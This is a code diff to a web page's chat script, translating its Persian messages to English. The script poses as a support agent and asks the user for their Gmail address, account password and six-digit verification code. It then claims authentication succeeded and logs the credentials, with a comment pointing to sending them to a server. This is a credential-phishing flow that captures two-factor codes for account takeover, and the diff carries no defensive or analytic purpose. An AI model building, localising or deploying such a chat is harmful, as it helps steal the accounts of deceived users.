@@ -333,7 +333,7 @@
           case STATE.INITIAL:
             // After initial message, ask for email
             currentState = STATE.ASK_EMAIL;
-            addMessage("لطفاً آدرس جیمیل خود را ارسال کنید.", 'support');
+            addMessage("Please send your Gmail address.", 'support');
             break;
             
           case STATE.ASK_EMAIL:
@@ -341,9 +341,9 @@
             if (text.includes('@gmail.com')) {
               userEmail = text;
               currentState = STATE.ASK_PASSWORD;
-              addMessage("لطفاً رمز عبور حساب خود را ارسال کنید.", 'support');
+              addMessage("Please send your account password.", 'support');
             } else {
-              addMessage("آدرس جیمیل معتبر نیست. لطفاً یک آدرس جیمیل صحیح وارد کنید.", 'support');
+              addMessage("The Gmail address is not valid. Please enter a valid Gmail address.", 'support');
             }
             break;
             
@@ -351,23 +351,23 @@
             // Store password and ask for verification code
             userPassword = text;
             currentState = STATE.ASK_VERIFICATION_CODE;
-            addMessage(`کد تأیید به آدرس ${userEmail} ارسال شد. لطفاً کد دریافتی را وارد کنید.`, 'support');
+            addMessage(`A verification code has been sent to ${userEmail}. Please enter the code you received.`, 'support');
             break;
             
           case STATE.ASK_VERIFICATION_CODE:
             // Check verification code (simple check)
             if (text.length === 6 && /^\d+$/.test(text)) {
               currentState = STATE.COMPLETED;
-              addMessage("احراز هویت با موفقیت انجام شد. اطلاعات شما دریافت گردید.", 'support');
+              addMessage("Authentication was successful. Your information has been received.", 'support');
               // Here you would typically send the data to your server
               console.log('User credentials:', {email: userEmail, password: userPassword, code: text});
             } else {
-              addMessage("کد تأیید نامعتبر است. لطفاً یک کد 6 رقمی وارد کنید.", 'support');
+              addMessage("The verification code is invalid. Please enter a 6-digit code.", 'support');
             }
             break;
             
           case STATE.COMPLETED:
-            addMessage("فرآیند تکمیل شده است. برای کمک بیشتر پیام دهید.", 'support');
+            addMessage("The process is complete. Message for further assistance.", 'support');
             break;
         }
       };
@@ -387,7 +387,7 @@
         const loading = document.createElement('div');
         loading.className = 'message support loading';
         loading.id = id;
-        loading.innerHTML = 'در حال پاسخگویی <span class="dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>';
+        loading.innerHTML = 'Responding <span class="dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>';
         messagesEl.appendChild(loading);
         scrollToBottom();
         return id;
